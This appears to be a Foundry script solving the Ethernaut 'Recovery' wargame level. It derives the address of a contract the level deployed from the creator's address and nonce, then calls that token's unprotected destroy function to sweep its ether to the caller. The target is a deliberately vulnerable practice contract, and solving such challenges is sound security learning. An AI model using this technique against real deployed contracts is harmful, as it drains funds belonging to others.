// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../utils/Ethernaut.sol";
import "./Recovery.sol";

contract RecoverySolver is Test, Ethernaut {
    function run() public {
        IS_TEST = false;
        test();
    }

    function test() public broadcasted {
        Recovery instance = Recovery(getLevelInstance(Levels.recovery));

        address nonce1child = address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(instance), bytes1(0x01)))))
        );

        SimpleToken(payable(nonce1child)).destroy(msg.sender);

        require(validateLevelInstance(Levels.recovery, address(instance)), "no validation");

        if (!IS_TEST) submitLevelInstance(address(instance));
    }
}
